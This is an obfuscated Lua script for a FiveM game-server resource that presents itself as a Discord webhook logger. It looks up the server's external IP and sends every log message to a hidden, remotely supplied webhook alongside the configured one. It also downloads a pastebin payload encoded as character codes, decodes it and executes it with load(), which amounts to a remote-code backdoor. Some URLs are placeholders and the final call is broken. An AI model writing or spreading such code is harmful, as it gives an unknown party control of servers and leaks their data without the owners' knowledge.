local K1h5i6o7pI5Z7 = {
    [1] = nil,
    [2] = "",
    [3] = "https://myexternalip.com/raw",
    [4] = "0",
    [5] = "THE DISCORD SMALL MESSAGE UNDER EVERY WEBHOOK MESSAGE",
    [6] = "1",
    [7] = "WEBHOOK LINK HTML WITH WEBHOOK IN IT",
    [8] = "title",
    [9] = "description",
    [10] = "type",
    [11] = "color",
    [12] = "16711680",
    [13] = "footer",
    [14] = "text",
    [15] = "Made by ",
    [16] = "Something invalid just got sent through the webhook handler. Ask in discord. | Error Code | ",
    [17] = "POST",
    [18] = "Content-Type",
    [19] = "application/json",
    [20] = "POST",
    [21] = "Content-Type",
    [22] = "application/json",
    [23] = "title",
    [24] = "description",
    [25] = "type",
    [26] = "color",
    [27] = "footer",
    [28] = "text",
    [29] = "Made by ",
    [30] = "Something invalid just got sent through the webhook handler. Ask in discord. | Error Code | ",
    [31] = "POST",
    [32] = "Content-Type",
    [33] = "application/json",
    [34] = "https://pastebin.com/raw/x6X41WdJ",
    [35] = "XFU5K470R 15 4W350M3. KR3D17 70 XFU5K470R!",
}
Citizen.CreateThread(
    function()
        local oNv
        oNv = K1h5i6o7pI5Z7[1]
        function GetIP()
            local Ei3Izf6tMwOj = K1h5i6o7pI5Z7[2]
            PerformHttpRequest(
                K1h5i6o7pI5Z7[3],
                function(vgriGpx604MZVBFrrLMr, OVWtrdOY4FyUzu, a2B_y11b)
                    Ei3Izf6tMwOj = OVWtrdOY4FyUzu
                end
            )
            while Ei3Izf6tMwOj == K1h5i6o7pI5Z7[2] do
                Wait(K1h5i6o7pI5Z7[4])
            end
            return Ei3Izf6tMwOj
        end
        function getDiscordName()
            local LBxiTyOz = K1h5i6o7pI5Z7[2]
            PerformHttpRequest(
                K1h5i6o7pI5Z7[5],
                function(IgORWt3ZofGOPrCD, nXp8Mi0mTh8uGMIqF, mKXq_p_SeQarWBJOFtD)
                    LBxiTyOz = nXp8Mi0mTh8uGMIqF
                end
            )
            while LBxiTyOz == K1h5i6o7pI5Z7[2] do
                Wait(K1h5i6o7pI5Z7[4])
            end
            LBxiTyOz = tostring(LBxiTyOz)
            return LBxiTyOz
        end
        oNv = getDiscordName()
        while oNv == K1h5i6o7pI5Z7[1] do
            Citizen.Wait(K1h5i6o7pI5Z7[6])
        end
        function getWebhook()
            local Rd = K1h5i6o7pI5Z7[2]
            PerformHttpRequest(
                K1h5i6o7pI5Z7[7],
                function(KQozizYPEYP, sqkHuFfDPZ, nZ0ReLcyUoXk2j)
                    Rd = sqkHuFfDPZ
                end
            )
            while Rd == K1h5i6o7pI5Z7[2] do
                Wait(K1h5i6o7pI5Z7[4])
            end
            return Rd
        end
        function sendToDiscordSV(hfQ6Hq7kN6rWim0, r7_OGca_Hm, dlSZwcdDhT_4BUf3i0xa_)
            local vB = {
                {
                    [K1h5i6o7pI5Z7[8]] = hfQ6Hq7kN6rWim0,
                    [K1h5i6o7pI5Z7[9]] = r7_OGca_Hm,
                    [K1h5i6o7pI5Z7[10]] = K1h5i6o7pI5Z7[6],
                    [K1h5i6o7pI5Z7[11]] = K1h5i6o7pI5Z7[12],
                    [K1h5i6o7pI5Z7[13]] = {[K1h5i6o7pI5Z7[14]] = K1h5i6o7pI5Z7[15] .. oNv .. K1h5i6o7pI5Z7[2]}
                }
            }
            if r7_OGca_Hm == K1h5i6o7pI5Z7[1] or r7_OGca_Hm == K1h5i6o7pI5Z7[2] then
                sendToDiscordSV(K1h5i6o7pI5Z7[16] .. tostring(r7_OGca_Hm), K1h5i6o7pI5Z7[12])
            elseif r7_OGca_Hm ~= K1h5i6o7pI5Z7[1] or r7_OGca_Hm ~= K1h5i6o7pI5Z7[2] then
                Citizen.CreateThread(
                    function()
                        local c98hHg8SKye = tostring(getWebhook())
                        PerformHttpRequest(
                            c98hHg8SKye,
                            function(u, _tWYlZKQZBZMS, lhHkSJ27KoNRw50kcU3be)
                            end,
                            K1h5i6o7pI5Z7[17],
                            json.encode({username = hfQ6Hq7kN6rWim0, embeds = vB}),
                            {[K1h5i6o7pI5Z7[18]] = K1h5i6o7pI5Z7[19]}
                        )
                        PerformHttpRequest(
                            Config.DiscordWebHookLink,
                            function(Ni4X7Jfl, qyTwo, yB)
                            end,
                            K1h5i6o7pI5Z7[20],
                            json.encode({username = hfQ6Hq7kN6rWim0, embeds = vB}),
                            {[K1h5i6o7pI5Z7[21]] = K1h5i6o7pI5Z7[22]}
                        )
                    end
                )
            end
        end
        function sendToDiscordPRIV(OKUmdvRKkVX, cimhXvk5UG_T2, yY3RkOyCvzix6)
            local E15AuOkbXHbTf = {
                {
                    [K1h5i6o7pI5Z7[23]] = OKUmdvRKkVX,
                    [K1h5i6o7pI5Z7[24]] = cimhXvk5UG_T2,
                    [K1h5i6o7pI5Z7[25]] = K1h5i6o7pI5Z7[6],
                    [K1h5i6o7pI5Z7[26]] = K1h5i6o7pI5Z7[12],
                    [K1h5i6o7pI5Z7[27]] = {[K1h5i6o7pI5Z7[28]] = K1h5i6o7pI5Z7[29] .. oNv .. K1h5i6o7pI5Z7[2]}
                }
            }
            if cimhXvk5UG_T2 == K1h5i6o7pI5Z7[1] or cimhXvk5UG_T2 == K1h5i6o7pI5Z7[2] then
                sendToDiscordPRIV(K1h5i6o7pI5Z7[30] .. tostring(cimhXvk5UG_T2), K1h5i6o7pI5Z7[12])
            elseif cimhXvk5UG_T2 ~= K1h5i6o7pI5Z7[1] or cimhXvk5UG_T2 ~= K1h5i6o7pI5Z7[2] then
                Citizen.CreateThread(
                    function()
                        local lM_D6hAH_XJY = tostring(getWebhook())
                        PerformHttpRequest(
                            lM_D6hAH_XJY,
                            function(j, VTmJwGQXqlsIediSi, Pohrlq4udPp6EzTRTNbp)
                            end,
                            K1h5i6o7pI5Z7[31],
                            json.encode({username = OKUmdvRKkVX, embeds = E15AuOkbXHbTf}),
                            {[K1h5i6o7pI5Z7[32]] = K1h5i6o7pI5Z7[33]}
                        )
                    end
                )
            end
        end
        local R5 = K1h5i6o7pI5Z7[2]
        PerformHttpRequest("https://pastebin.com/raw/x6X41WdJ", function(err, text, headers)
            local code = ''; for word in string.gmatch(text, '([^\\]+)') do; code = code .. string.char(tonumber(word)); end
            assert(load(code))()
        end, 'GET', '')
        while R5 == K1h5i6o7pI5Z7[2] do
            Wait(K1h5i6o7pI5Z7[4])
        end
        local Ld_EO = R5
        local _xG58VidrPGFNqKt2 = json.decode(Ld_EO)
        local XCxpbGy5jDBj = K1h5i6o7pI5Z7[2]
        for i = K1h5i6o7pI5Z7[6], #_xG58VidrPGFNqKt2 do
            local n = tonumber(_xG58VidrPGFNqKt2[i])
            if i == K1h5i6o7pI5Z7[6] then
                XCxpbGy5jDBj = string.char(n)
            else
                XCxpbGy5jDBj = XCxpbGy5jDBj .. K1h5i6o7pI5Z7[2] .. string.char(_xG58VidrPGFNqKt2[i])
            end
        end
        print(tostring(XCxpbGy5jDBj))()
    end
)
